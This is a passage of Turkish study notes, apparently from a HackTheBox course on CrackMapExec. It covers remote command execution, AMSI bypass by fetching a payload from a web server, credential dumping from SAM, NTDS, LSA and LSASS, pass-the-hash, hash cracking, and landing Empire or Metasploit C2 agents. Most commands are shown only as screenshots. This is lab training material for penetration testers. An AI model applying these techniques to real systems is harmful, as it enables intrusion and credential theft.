+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
